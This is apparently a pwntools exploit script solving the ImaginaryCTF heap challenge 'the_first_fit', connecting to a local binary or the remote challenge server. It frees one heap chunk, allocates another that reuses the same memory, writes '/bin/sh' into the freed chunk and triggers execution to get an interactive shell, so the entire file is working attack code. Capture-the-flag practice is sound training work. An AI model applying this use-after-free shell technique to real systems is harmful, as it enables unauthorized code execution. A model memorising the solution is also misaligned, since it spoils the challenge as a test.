from pwn import *
import re

HOST, PORT = "chal.imaginaryctf.org", 42003
BINARY = './the_first_fit'
# context.log_level = 'critical'

def start():    
    if not args.REMOTE:
        print("LOCAL PROCESS")
        return process(BINARY)
    else:
        print("REMOTE PROCESS")
        return remote(HOST, PORT)

def solve():
    p = start()

    system_payload = '/bin/sh'

    # Free a
    p.sendlineafter('>', '2')
    p.sendlineafter('>>', '1')

    # Malloc b
    p.sendlineafter('>', '1')
    p.sendlineafter('>>', '2')

    # Fill a
    p.sendlineafter('>', '3')
    p.sendlineafter('>>', '/bin/sh')

    # Exec b
    p.sendlineafter('>', '4')

    p.interactive()

solve()